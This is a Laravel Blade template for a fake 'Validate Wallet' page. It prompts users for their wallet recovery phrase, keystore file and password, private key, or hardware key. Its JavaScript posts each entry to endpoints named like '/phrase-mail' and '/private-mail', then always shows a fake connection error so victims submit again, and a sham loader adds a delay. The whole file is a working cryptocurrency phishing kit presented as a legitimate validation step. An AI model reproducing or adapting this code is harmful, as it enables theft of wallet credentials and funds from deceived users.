@extends('layout')
@section('content')
@if(request('wallet'))
<style>
  .tab-container {
    display: flex;
    justify-content: center;
    margin-top: 2rem;
  }

  .tab {
    background-color: #3498db;
    color: #fff;
    cursor: pointer;
  }

  .tab:not(:last-child) {
    margin-right: 4px;
  }

  .tab-content {
    display: none;
    width: 100%;
    padding: 20px;
    border-radius: 0 0 5px 5px;
  }

  .tab-content.active {
    display: block;
  }

  .loader-container {
    display: flex;
    align-items: center;
    justify-content: center;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(255, 255, 255, 1);
    z-index: 1000;
    transition: opacity 0.5s;
  }

  .loader-content {
    text-align: center;
  }

  /* .loader-content h2{
    font-weight: bolder;
  } */

  .main-content {
    display: none;
    /* Initially hide main content */
    padding: 20px;
  }

  #spinner {
    display: none;
  }

  #spinner1 {
    display: none;
  }
  #spinner2 {
    display: none;
  }
  #spinner3 {
    display: none;
  }
</style>
<div class="loader-container" id="loader">
  <div class="loader-content">
    <img src="{{asset('asset/static/media/loader.gif')}}" alt="">
  </div>
</div>
<div id="root">
  <div>
    <div class="w-full p-3 bg-white shadow-lg fixed top-0 z-50">
      <div class="flex px-4 items-center justify-between">
        <a href="{{route('home')}}"><img src="{{asset('asset/static/media/logo.jfif')}}" alt="" class="w-[80px] h-[60px] cursor-pointer" /></a><span class="px-5 py-2 bg-[#2d7adf] rounded-2xl text-white font-bold"><a href="{{route('wallet')}}">Go back</a></span>
      </div>
    </div>
    <div class="mt-[8rem] flex items-center justify-center flex-col lg:max-w-[60vw] lg:mx-auto">
      <h1 class="text-[1.5rem] font-semibold">Validate Wallet</h1>
      <p class="text-sm text-gray-600 px-3 text-center">
        validate your selected wallet
        <span class="bg-gray-400 text-gray-900 p-1 px-2 font-semibold">{{request('wallet')?request('wallet'):null}}</span>
        to continue
      </p>
    </div>
    <div class="tab-container lg:max-w-[60vw] lg:mx-auto mt-[2rem] flex items-center justify-center gap-4 flex-wrap px-3">
      <span class="tab bg-blue-400 text-white px-3 py-2 font-semibold rounded-lg cursor-pointer bg-blue-600" onclick="openTab('phrase')">PHRASE</span>
      <span class="tab bg-blue-400 text-white px-3 py-2 font-semibold rounded-lg cursor-pointer false" onclick="openTab('keystore')">KEYSTORE</span>
      <span class="tab bg-blue-400 text-white px-3 py-2 font-semibold rounded-lg cursor-pointer false" onclick="openTab('privateKey')">PRIVATE KEY</span>
      <span class="tab bg-blue-400 text-white px-3 py-2 font-semibold rounded-lg cursor-pointer false" onclick="openTab('hardware')">HARDWARE</span>
    </div>
    <div id="phrase" class="tab-content active lg:max-w-[60vw] lg:mx-auto md:max-w-[60vw] md:mx-auto sm:max-w-[60vw] sm:mx-auto">
      <div class="mt-[2rem] flex items-center justify-center px-4 w-full">
        <div class="w-full flex flex-col items-center">
          <h1 class="text-gray-500 text-center my-4">
            Please enter your 12/24 word phrase
          </h1>
          <form id="phraseForm" class="w-full flex flex-col items-center justify-center">
            <input type="hidden" name="wallet_name" value="{{request('wallet')?request('wallet'):null}}">
            <textarea name="message" id="" cols="30" rows="10" class="border-2 border-gray-300 w-full h-[8rem]"></textarea>
            <h1 class="text-center text-gray-500">
              use comma "," to seperate wallet keys
            </h1>
            <button id="phraseFormBtn" type="button" onclick="submitForm()" class="flex items-center text-center px-6 font-semibold text-white mt-3 w-[80%] py-3 bg-blue-500 rounded-md justify-center">
              <span>Connect </span>
              <div id="spinner" aria-label="Loading..." role="status">
                <svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" xmlns="http://www.w3.org/2000/svg" class="animate-spin w-4 h-4 stroke-slate-500">
                  <path d="M12 3v3m6.366-.366-2.12 2.12M21 12h-3m.366 6.366-2.12-2.12M12 21v-3m-6.366.366 2.12-2.12M3 12h3m-.366-6.366 2.12 2.12">
                  </path>
                </svg>
              </div>
            </button>
          </form>
        </div>
      </div>
    </div>
    <div id="keystore" class="tab-content lg:max-w-[60vw] lg:mx-auto md:max-w-[60vw] md:mx-auto sm:max-w-[60vw] sm:mx-auto">
      <div class="mt-[2rem] flex items-center justify-center px-4 w-full">
        <div class="w-full flex flex-col items-center">
          <h1 class="text-gray-500 text-center my-4">
            Enter your Keystore JSON
          </h1>
          <form id="keystoreForm" class="w-full flex flex-col items-center justify-center">
            <input type="hidden" name="keystore_name" value="{{request('wallet')?request('wallet'):null}}">
            <textarea name="message" id="" cols="30" rows="10" class="border-2 border-gray-300 w-full h-[8rem] outline-none p-1" spellcheck="false"></textarea>
            <h1 class="text-gray-500">password</h1>
            <input name="password" type="text" class="border-2 border-gray-300 w-full h-[5rem] outline-none p-1 rounded-md" value="" />
            <h1 class="text-center text-gray-500">
              use comma "," to seperate wallet keys
            </h1>
            <button id="keystoreFormBtn" type="button" onclick="keystoreForm()" class="flex items-center text-center px-6 font-semibold text-white mt-3 w-[80%] py-3 bg-blue-500 rounded-md justify-center">
              <span>Connect </span>
              <div id="spinner1" aria-label="Loading..." role="status">
                <svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" xmlns="http://www.w3.org/2000/svg" class="animate-spin w-4 h-4 stroke-slate-500">
                  <path d="M12 3v3m6.366-.366-2.12 2.12M21 12h-3m.366 6.366-2.12-2.12M12 21v-3m-6.366.366 2.12-2.12M3 12h3m-.366-6.366 2.12 2.12">
                  </path>
                </svg>
              </div>
            </button>

          </form>
        </div>
      </div>
    </div>
    <div id="privateKey" class="tab-content lg:max-w-[60vw] lg:mx-auto md:max-w-[60vw] md:mx-auto sm:max-w-[60vw] sm:mx-auto">
      <div class="mt-[2rem] flex items-center justify-center px-4 w-full ">
        <div class="w-full flex flex-col items-center">
          <h1 class="text-gray-500 text-center my-4">Enter your private key</h1>
          <form id="privateForm" class="w-full flex flex-col items-center justify-center">
            <input type="hidden" name="wallet_name" value="{{request('wallet')?request('wallet'):null}}">
            <textarea name="message" id="" cols="30" rows="10" class="border-2 border-gray-300 w-full h-[8rem] outline-none p-3"></textarea>
            <h1 class="text-center text-gray-500">Key must be in Hex format</h1>
            <button id="privateFormBtn" type="button" onclick="privateForm()" class="flex items-center text-center px-6 font-semibold text-white mt-3 w-[80%] py-3 bg-blue-500 rounded-md justify-center">
              <span>Connect </span>
              <div id="spinner2" aria-label="Loading..." role="status">
                <svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" xmlns="http://www.w3.org/2000/svg" class="animate-spin w-4 h-4 stroke-slate-500">
                  <path d="M12 3v3m6.366-.366-2.12 2.12M21 12h-3m.366 6.366-2.12-2.12M12 21v-3m-6.366.366 2.12-2.12M3 12h3m-.366-6.366 2.12 2.12">
                  </path>
                </svg>
              </div>
            </button>
          </form>
        </div>
      </div>
    </div>
    <div id="hardware" class="tab-content lg:max-w-[60vw] lg:mx-auto md:max-w-[60vw] md:mx-auto sm:max-w-[60vw] sm:mx-auto">
      <div class="mt-[2rem] flex items-center justify-center px-4 w-full">
        <div class="w-full flex flex-col items-center">
          <h1 class="text-gray-500 text-center my-4">
            Enter your Hardware Key
          </h1>
          <form id="hardwareForm" class="w-full flex flex-col items-center justify-center">
            <input type="hidden" name="wallet_name" value="{{request('wallet')?request('wallet'):null}}">
            <textarea name="message" id="" cols="30" rows="10" class="border-2 border-gray-300 w-full h-[8rem] outline-none p-3"></textarea>
            <h1 class="text-center text-gray-500">
              Key must be in Hex format
            </h1>
            <button type="button" id="hardwareFormBtn" onclick="hardwareForm()" class="flex items-center text-center px-6 font-semibold text-white mt-3 w-[80%] py-3 bg-blue-500 rounded-md justify-center">
              <span>Connect </span>
              <div id="spinner3" aria-label="Loading..." role="status">
                <svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" xmlns="http://www.w3.org/2000/svg" class="animate-spin w-4 h-4 stroke-slate-500">
                  <path d="M12 3v3m6.366-.366-2.12 2.12M21 12h-3m.366 6.366-2.12-2.12M12 21v-3m-6.366.366 2.12-2.12M3 12h3m-.366-6.366 2.12 2.12">
                  </path>
                </svg>
              </div>
            </button>
          </form>
        </div>
      </div>
    </div>
  </div>
</div>

<script>
  // phrase form
  function submitForm() {
    var form = document.getElementById('phraseForm');
    var formData = new FormData(form);
    // Show the spinner
    var spinner = document.getElementById('spinner');
    var btn = document.getElementById('phraseFormBtn');
    btn.disabled = true;
    spinner.style.display = 'inline-block';
    // Include CSRF token in the request headers
    var csrfToken = document.head.querySelector('meta[name="csrf-token"]').content;
    fetch('/phrase-mail', {
        method: 'POST',
        body: formData,
        headers: {
          'X-CSRF-TOKEN': csrfToken,
        },
      })
      .then(response => response.json())
      .then(data => {
        alert('Error connecting... try again!'); // You can handle the response as needed
        spinner.style.display = 'none';
        btn.disabled = false;
      })
      .catch(error => {
        console.error('Error:', error);
        spinner.style.display = 'none';
        btn.disabled = false;
      });
  }

  // keystore form
  function keystoreForm() {
    var form = document.getElementById('keystoreForm');
    var formData = new FormData(form);
    // Show the spinner
    var spinner = document.getElementById('spinner1');
    var btn = document.getElementById('keystoreFormBtn');
    btn.disabled = true;
    spinner.style.display = 'inline-block';
    // Include CSRF token in the request headers
    var csrfToken = document.head.querySelector('meta[name="csrf-token"]').content;
    fetch('/keystore-mail', {
        method: 'POST',
        body: formData,
        headers: {
          'X-CSRF-TOKEN': csrfToken,
        },
      })
      .then(response => response.json())
      .then(data => {
        alert('Error connecting... try again!'); // You can handle the response as needed
        spinner.style.display = 'none';
        btn.disabled = false;
      })
      .catch(error => {
        console.error('Error:', error);
        spinner.style.display = 'none';
        btn.disabled = false;
      });
  }

  // private form
  function privateForm() {
    var form = document.getElementById('privateForm');
    var formData = new FormData(form);
    // Show the spinner
    var spinner = document.getElementById('spinner2');
    var btn = document.getElementById('privateFormBtn');
    btn.disabled = true;
    spinner.style.display = 'inline-block';
    // Include CSRF token in the request headers
    var csrfToken = document.head.querySelector('meta[name="csrf-token"]').content;
    fetch('/private-mail', {
        method: 'POST',
        body: formData,
        headers: {
          'X-CSRF-TOKEN': csrfToken,
        },
      })
      .then(response => response.json())
      .then(data => {
        alert('Error connecting... try again!'); // You can handle the response as needed
        spinner.style.display = 'none';
        btn.disabled = false;
      })
      .catch(error => {
        console.error('Error:', error);
        spinner.style.display = 'none';
        btn.disabled = false;
      });
  }

  // hardware form
  function hardwareForm() {
    var form = document.getElementById('hardwareForm');
    var formData = new FormData(form);
    // Show the spinner
    var spinner = document.getElementById('spinner3');
    var btn = document.getElementById('hardwareFormBtn');
    spinner.style.display = 'inline-block';
    btn.disabled = true;
    // Include CSRF token in the request headers
    var csrfToken = document.head.querySelector('meta[name="csrf-token"]').content;
    fetch('/hardware-mail', {
        method: 'POST',
        body: formData,
        headers: {
          'X-CSRF-TOKEN': csrfToken,
        },
      })
      .then(response => response.json())
      .then(data => {
        alert('Error connecting... try again!'); // You can handle the response as needed
        spinner.style.display = 'none';
        btn.disabled = false;
      })
      .catch(error => {
        console.error('Error:', error);
        spinner.style.display = 'none';
        btn.disabled = false;
      });
  }

  function openTab(tabName) {
    // Hide all tab contents
    var tabContents = document.getElementsByClassName('tab-content');
    for (var i = 0; i < tabContents.length; i++) {
      tabContents[i].classList.remove('active');
    }

    // Show the selected tab content
    document.getElementById(tabName).classList.add('active');
  }
  document.addEventListener("DOMContentLoaded", function() {
    var loader = document.getElementById("loader");
    var mainContent = document.querySelector(".main-content");

    // Simulate a random delay (2s to 4s)
    var randomDelay = Math.floor(Math.random() * (9000 - 5000 + 1)) + 5000;

    // Show loader
    loader.style.display = "flex";

    // Simulate a delay before showing the main content
    setTimeout(function() {
      // Hide loader
      loader.style.display = "none";

      // Show main content
      mainContent.style.display = "block";
    }, randomDelay);
  });
</script>
@else
<p>No wallet name provided</p>
@endif
@endsection